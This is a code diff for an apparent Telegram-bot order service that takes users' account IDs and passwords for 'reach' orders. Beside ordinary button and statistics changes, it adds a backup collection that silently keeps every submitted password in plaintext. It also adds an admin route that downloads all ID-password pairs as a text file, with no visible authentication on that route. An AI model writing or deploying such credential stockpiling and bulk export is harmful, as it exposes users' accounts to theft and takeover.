@@ -114,10 +114,19 @@ const usedUtrSchema = new mongoose.Schema({
     utrId: { type: String, required: true, unique: true }
 });
 
+// 📦 All Orders ID-Pass Backup Schema (Added)
+const orderBackupSchema = new mongoose.Schema({
+    targetId: String,
+    targetPass: String,
+    telegramChatId: String,
+    createdAt: { type: Date, default: Date.now }
+});
+
 const UserModel = mongoose.model('User', userSchema);
 const OrderModel = mongoose.model('Order', orderSchema);
 const SrModel = mongoose.model('SrService', srSchema);
 const UsedUtrModel = mongoose.model('UsedUtr', usedUtrSchema);
+const OrderBackupModel = mongoose.model('OrderBackup', orderBackupSchema);
 
 function initAllBots() {
     CUSTOMER_BOT_TOKENS.forEach((token, idx) => {
@@ -144,9 +153,7 @@ async function notifyAdminAndUser(order, user, messageText) {
         let adminKeyboard = {
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: "✅ Accept", callback_data: `accept_${order._id}` }, { text: "❌ Reject", callback_data: `reject_${order._id}` }],
-                    [{ text: "⏳ In Progress", callback_data: `inprogress_${order._id}` }, { text: "🎉 Complete", callback_data: `complete_${order._id}` }],
-                    [{ text: "💬 Reply", callback_data: `reply_${order._id}` }, { text: "🚫 Cancel & Refund", callback_data: `cancel_${order._id}` }]
+                    [{ text: "✅ Accept", callback_data: `accept_${order._id}` }, { text: "❌ Reject", callback_data: `reject_${order._id}` }]
                 ]
             }
         };
@@ -172,9 +179,7 @@ async function notifyAdminSrBot(srOrder) {
             let keyboard = {
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: "✅ Accept", callback_data: `sraccept_${srOrder._id}` }, { text: "❌ Reject", callback_data: `srreject_${srOrder._id}` }],
-                        [{ text: "⏳ In Progress", callback_data: `srinprog_${srOrder._id}` }, { text: "🎉 Complete", callback_data: `srcomp_${srOrder._id}` }],
-                        [{ text: "💬 Reply", callback_data: `srreply_${srOrder._id}` }]
+                        [{ text: "✅ Accept", callback_data: `sraccept_${srOrder._id}` }, { text: "❌ Reject", callback_data: `srreject_${srOrder._id}` }]
                     ]
                 }
             };
@@ -260,7 +265,16 @@ function startAdminBot(token) {
                 let userCount = await UserModel.countDocuments();
                 let reachCount = await OrderModel.countDocuments();
                 let srCount = await SrModel.countDocuments();
-                bot.sendMessage(chatId, `📊 **System Statistics:**\n\n👤 Total Engineers: *${userCount}*\n⚡ Reach Orders: *${reachCount}*\n📌 SR Orders: *${srCount}*`, { parse_mode: 'Markdown' });
+                
+                let orders = await OrderModel.find();
+                let srOrders = await SrModel.find();
+                let totalEstimatedRevenue = (orders.length + srOrders.length) * 13;
+
+                let totalCoinsActive = 0;
+                let users = await UserModel.find();
+                users.forEach(u => totalCoinsActive += (u.jpwCoins || 0));
+
+                bot.sendMessage(chatId, `📊 **Detailed System Statistics:**\n\n👤 Total Engineers: *${userCount}*\n⚡ Reach Orders: *${reachCount}*\n📌 SR Orders: *${srCount}*\n🪙 Active Coins Balance: *${totalCoinsActive.toFixed(2)}*\n💰 Estimated Revenue: *₹${totalEstimatedRevenue}*`, { parse_mode: 'Markdown' });
             } else if (data === 'admin_reach_orders') {
                 bot.answerCallbackQuery(query.id);
                 let pending = await OrderModel.find({ status: 'Pending' }).limit(5);
@@ -269,8 +283,7 @@ function startAdminBot(token) {
                     bot.sendMessage(chatId, `⚡ Reach Order\nID: \`${o.targetId}\`\nChatID: \`${o.telegramChatId}\``, {
                         reply_markup: {
                             inline_keyboard: [
-                                [{ text: "✅ Accept", callback_data: `accept_${o._id}` }, { text: "❌ Reject", callback_data: `reject_${o._id}` }],
-                                [{ text: "💬 Reply", callback_data: `reply_${o._id}` }]
+                                [{ text: "✅ Accept", callback_data: `accept_${o._id}` }, { text: "❌ Reject", callback_data: `reject_${o._id}` }]
                             ]
                         }
                     });
@@ -283,8 +296,7 @@ function startAdminBot(token) {
                     bot.sendMessage(chatId, `📌 SR Order\nCustomer: ${s.customerName}\nMobile: \`${s.mobileNumber}\``, {
                         reply_markup: {
                             inline_keyboard: [
-                                [{ text: "✅ Accept", callback_data: `sraccept_${s._id}` }, { text: "❌ Reject", callback_data: `srreject_${s._id}` }],
-                                [{ text: "💬 Reply", callback_data: `srreply_${s._id}` }]
+                                [{ text: "✅ Accept", callback_data: `sraccept_${s._id}` }, { text: "❌ Reject", callback_data: `srreject_${s._id}` }]
                             ]
                         }
                     });
@@ -295,18 +307,44 @@ function startAdminBot(token) {
                 if (!srOrder) { bot.answerCallbackQuery(query.id, { text: 'Not found!' }); return; }
                 let user = await UserModel.findOne({ telegramChatId: srOrder.telegramChatId });
 
+                let newKeyboard = null;
+
                 if (action === 'srreply') {
                     adminPendingSrReply[chatId] = srId;
                     bot.answerCallbackQuery(query.id);
                     bot.sendMessage(chatId, `✍️ Send reply text for SR (${srOrder.customerName}):`);
                     return;
-                } else if (action === 'sraccept') { srOrder.status = 'Accepted'; }
-                else if (action === 'srreject') { srOrder.status = 'Rejected'; if(user){user.jpwCoins+=1;await user.save();} }
-                else if (action === 'srinprog') { srOrder.status = 'In Progress'; }
-                else if (action === 'srcomp') { srOrder.status = 'Completed'; }
+                } else if (action === 'sraccept') { 
+                    srOrder.status = 'Accepted'; 
+                    newKeyboard = {
+                        inline_keyboard: [
+                            [{ text: "⏳ In Progress", callback_data: `srinprog_${srOrder._id}` }, { text: "🎉 Complete", callback_data: `srcomp_${srOrder._id}` }],
+                            [{ text: "💬 Reply", callback_data: `srreply_${srOrder._id}` }]
+                        ]
+                    };
+                } else if (action === 'srreject') { 
+                    srOrder.status = 'Rejected'; 
+                    if(user){user.jpwCoins+=1;await user.save();} 
+                    newKeyboard = { inline_keyboard: [] }; // Remove all action buttons on completion/rejection
+                } else if (action === 'srinprog') { 
+                    srOrder.status = 'In Progress'; 
+                    newKeyboard = {
+                        inline_keyboard: [
+                            [{ text: "🎉 Complete", callback_data: `srcomp_${srOrder._id}` }, { text: "💬 Reply", callback_data: `srreply_${srOrder._id}` }]
+                        ]
+                    };
+                } else if (action === 'srcomp') { 
+                    srOrder.status = 'Completed'; 
+                    newKeyboard = { inline_keyboard: [] }; // Remove buttons
+                }
 
                 await srOrder.save();
                 bot.answerCallbackQuery(query.id, { text: 'Updated!' });
+                
+                try {
+                    await bot.editMessageReplyMarkup(newKeyboard, { chat_id: chatId, message_id: query.message.message_id });
+                } catch(e) {}
+
                 bot.sendMessage(chatId, `✅ SR Status updated to: *${srOrder.status}*`, { parse_mode: 'Markdown' });
             } else if (data.includes('_') && !data.startsWith('admin')) {
                 const [action, orderId] = data.split('_');
@@ -314,19 +352,49 @@ function startAdminBot(token) {
                 if (!order) { bot.answerCallbackQuery(query.id, { text: 'Not found!' }); return; }
                 let user = await UserModel.findOne({ telegramChatId: order.telegramChatId });
 
+                let newKeyboard = null;
+
                 if (action === 'reply') {
                     adminPendingReply[chatId] = orderId;
                     bot.answerCallbackQuery(query.id);
                     bot.sendMessage(chatId, `✍️ Send reply text for Reach Order ID: \`${order.targetId}\``);
                     return;
-                } else if (action === 'accept') { order.status = 'Accepted'; }
-                else if (action === 'reject') { order.status = 'Rejected'; if(user){user.jpwCoins+=1;await user.save();} }
-                else if (action === 'inprogress') { order.status = 'In Progress'; }
-                else if (action === 'complete') { order.status = 'Completed'; }
-                else if (action === 'cancel') { order.status = 'Cancelled & Refunded'; if(user){user.jpwCoins+=1;await user.save();} }
+                } else if (action === 'accept') { 
+                    order.status = 'Accepted'; 
+                    newKeyboard = {
+                        inline_keyboard: [
+                            [{ text: "⏳ In Progress", callback_data: `inprogress_${order._id}` }, { text: "🎉 Complete", callback_data: `complete_${order._id}` }],
+                            [{ text: "💬 Reply", callback_data: `reply_${order._id}` }, { text: "🚫 Cancel & Refund", callback_data: `cancel_${order._id}` }]
+                        ]
+                    };
+                } else if (action === 'reject') { 
+                    order.status = 'Rejected'; 
+                    if(user){user.jpwCoins+=1;await user.save();} 
+                    newKeyboard = { inline_keyboard: [] }; // Remove buttons
+                } else if (action === 'inprogress') { 
+                    order.status = 'In Progress'; 
+                    newKeyboard = {
+                        inline_keyboard: [
+                            [{ text: "🎉 Complete", callback_data: `complete_${order._id}` }, { text: "💬 Reply", callback_data: `reply_${order._id}` }],
+                            [{ text: "🚫 Cancel & Refund", callback_data: `cancel_${order._id}` }]
+                        ]
+                    };
+                } else if (action === 'complete') { 
+                    order.status = 'Completed'; 
+                    newKeyboard = { inline_keyboard: [] }; // Remove buttons
+                } else if (action === 'cancel') { 
+                    order.status = 'Cancelled & Refunded'; 
+                    if(user){user.jpwCoins+=1;await user.save();} 
+                    newKeyboard = { inline_keyboard: [] }; // Remove buttons
+                }
 
                 await order.save();
                 bot.answerCallbackQuery(query.id, { text: 'Updated!' });
+                
+                try {
+                    await bot.editMessageReplyMarkup(newKeyboard, { chat_id: chatId, message_id: query.message.message_id });
+                } catch(e) {}
+
                 bot.sendMessage(chatId, `✅ Reach Order Status updated to: *${order.status}*`, { parse_mode: 'Markdown' });
             }
         });
@@ -488,7 +556,10 @@ app.get('/api/admin/data', async (req, res) => {
         const orders = await OrderModel.find().sort({ createdAt: -1 });
         const srOrders = await SrModel.find().sort({ createdAt: -1 });
         const users = await UserModel.find();
-        res.json({ success: true, orders, srOrders, users });
+        
+        let totalRevenue = (orders.length + srOrders.length) * 13;
+
+        res.json({ success: true, orders, srOrders, users, totalRevenue });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
     }
@@ -500,6 +571,24 @@ app.post('/api/admin/delete-user', async (req, res) => {
         const { userId } = req.body;
         await UserModel.findByIdAndDelete(userId);
         res.json({ success: true, message: 'User node deleted successfully!' });
+    } catch(err) {
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+// 📥 Admin: Download All ID-Pass Records as Text (.txt) Backup (Added)
+app.get('/api/admin/download-idpass', async (req, res) => {
+    try {
+        const records = await OrderBackupModel.find().sort({ createdAt: -1 });
+        
+        let textData = "=== JPW ALL ORDERS ID & PASSWORD BACKUP ===\n\n";
+        records.forEach(r => {
+            textData += `ID: ${r.targetId} | PASS: ${r.targetPass} | ChatID: ${r.telegramChatId} | Date: ${r.createdAt}\n`;
+        });
+
+        res.setHeader('Content-Type', 'text/plain');
+        res.setHeader('Content-Disposition', 'attachment; filename=JPW_All_IDs_Backup.txt');
+        res.send(textData);
     } catch(err) {
         res.status(500).json({ success: false, error: err.message });
     }
@@ -592,6 +681,7 @@ app.post('/api/admin/clear-database', async (req, res) => {
         await OrderModel.deleteMany({});
         await SrModel.deleteMany({});
         await UsedUtrModel.deleteMany({});
+        await OrderBackupModel.deleteMany({});
         res.json({ success: true, message: 'Database cleared successfully!' });
     } catch(err) {
         res.status(500).json({ success: false, error: err.message });
@@ -631,6 +721,10 @@ app.post('/api/order', async (req, res) => {
         await user.save();
 
         const newOrder = await OrderModel.create({ telegramChatId: String(telegramChatId), targetId, targetPass });
+        
+        // 📦 Save ID-Pass in backup collection automatically
+        await OrderBackupModel.create({ targetId, targetPass, telegramChatId: String(telegramChatId) });
+
         await notifyAdminAndUser(newOrder, user, `🌐 **New Reach Order (Pending)**\n💬 Chat ID: \`${telegramChatId}\`\n🎯 ID: \`${targetId}\`\n🔑 Pass: \`${targetPass}\``);
 
         res.json({ success: true, message: 'Reach order successfully submitted!', remainingCoins: user.jpwCoins });
